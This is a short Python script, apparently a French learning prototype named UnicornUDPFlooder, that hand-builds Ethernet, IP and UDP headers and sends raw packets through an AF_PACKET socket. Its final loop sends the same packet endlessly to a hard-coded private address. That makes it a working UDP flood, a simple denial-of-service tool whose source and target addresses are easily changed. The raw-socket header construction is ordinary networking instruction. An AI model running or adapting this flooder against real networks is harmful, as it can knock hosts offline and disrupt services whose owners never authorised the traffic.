# ----------------------------------------------------------------------------
# Copyright © Ortega Ludovic, 2020
#
# Contributeur(s):
#     * Ortega Ludovic - mastership@hotmail.fr
#
# Ce logiciel, UnicornUDPFlooder est un prototype qui met en avant
# l'utilisation des RAW sockets en python
#
# Ce logiciel est régi par la licence CeCILL soumise au droit français et
# respectant les principes de diffusion des logiciels libres. Vous pouvez
# utiliser, modifier et/ou redistribuer ce programme sous les conditions
# de la licence CeCILL telle que diffusée par le CEA, le CNRS et l'INRIA
# sur le site "http://www.cecill.info".
#
# En contrepartie de l'accessibilité au code source et des droits de copie,
# de modification et de redistribution accordés par cette licence, il n'est
# offert aux utilisateurs qu'une garantie limitée.  Pour les mêmes raisons,
# seule une responsabilité restreinte pèse sur l'auteur du programme,  le
# titulaire des droits patrimoniaux et les concédants successifs.
#
# A cet égard  l'attention de l'utilisateur est attirée sur les risques
# associés au chargement,  à l'utilisation,  à la modification et/ou au
# développement et à la reproduction du logiciel par l'utilisateur étant
# donné sa spécificité de logiciel libre, qui peut le rendre complexe à
# manipuler et qui le réserve donc à des développeurs et des professionnels
# avertis possédant  des  connaissances  informatiques approfondies.  Les
# utilisateurs sont donc invités à charger  et  tester  l'adéquation  du
# logiciel à leurs besoins dans des conditions permettant d'assurer la
# sécurité de leurs systèmes et ou de leurs données et, plus généralement,
# à l'utiliser et l'exploiter dans les mêmes conditions de sécurité.
#
# Le fait que vous puissiez accéder à cet en-tête signifie que vous avez
# pris connaissance de la licence CeCILL, et que vous en avez accepté les
# termes.
# ----------------------------------------------------------------------------

import socket
import struct


class EthernetHeader:
    """
    Generate Ethernet header
    :param mac_dest: MAC destination adddress
    :param mac_src: MAC source adddress
    """
    def __init__(self, mac_dest, mac_src):
        self.mac_dest = self.__mac_to_bytes(mac_dest)
        self.mac_src = self.__mac_to_bytes(mac_src)
        self.ethertype = b'\x08\x00'

    def __mac_to_bytes(self, mac):
        """
        Convert MAC address to Bytes
        ff:ff:ff:ff:ff:ff -> \xff\xff\xff\xff\xff\xff
        """
        return bytes.fromhex(mac.replace(':', ''))

    def get_header(self):
        return self.mac_dest + self.mac_src + self.ethertype


class IPHeader(EthernetHeader):
    """
    Generate IP header
    :param mac_dest: MAC destination adddress
    :param mac_src: MAC source adddress
    :param ip_src: IP source adddress
    :param udp_length: UDP data length
    """
    def __init__(self, mac_dest, mac_src, ip_src, ip_dest, udp_length):
        self.version_ihl_tos = b'\x45\x00'
        self.total_length = struct.pack('!H', 20 + udp_length)
        self.identification = b'\xab\xcd'
        self.flags_fragment = b'\x40\x00'
        self.ttl_protocol = b'\x40\x11'
        self.ip_src = self.__ip_to_bytes(ip_src)
        self.ip_dest = self.__ip_to_bytes(ip_dest)
        self.headerChecksum = b'\x00\x00'
        super().__init__(mac_dest, mac_src)

    def __ip_to_bytes(self, ip):
        """
        Convert IP address to Bytes
        127.0.0.1 -> \x7f\x00\x00\x01
        """
        return bytes(map(int, ip.split('.')))

    def get_header(self):
        return super().get_header() \
               + self.version_ihl_tos \
               + self.total_length \
               + self.identification \
               + self.flags_fragment \
               + self.ttl_protocol \
               + self.headerChecksum \
               + self.ip_src \
               + self.ip_dest


class UDPHeader(IPHeader):
    """
    Generate UDP header
    :param ip_src: IP source adddress
    :param ip_dest: IP destination adddress
    :param port_src: Source port
    :param port_dest: Destination port
    :param data: Data to send
    """
    def __init__(self, mac_dest, mac_src, ip_src, ip_dest, port_src, port_dest, data):
        self.port_src = struct.pack('!H', port_src)
        self.port_dest = struct.pack('!H', port_dest)
        self.length = struct.pack('!H', 8 + len(data))
        self.checksum = b'\x00\x00'
        super().__init__(mac_dest, mac_src, ip_src, ip_dest, int.from_bytes(self.length, "big"))

    def get_header(self):
        return super().get_header() + self.port_src + self.port_dest + self.length + self.checksum


headers = UDPHeader("00:50:56:8f:62:a6", "00:50:56:8f:82:9e", "192.168.10.41", "192.168.20.50", 50000, 50000, "UNICORN !!!")

while True:
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
    s.bind(("ens192", socket.htons(3)))
    s.send(headers.get_header() + b"UNICORN !!!")
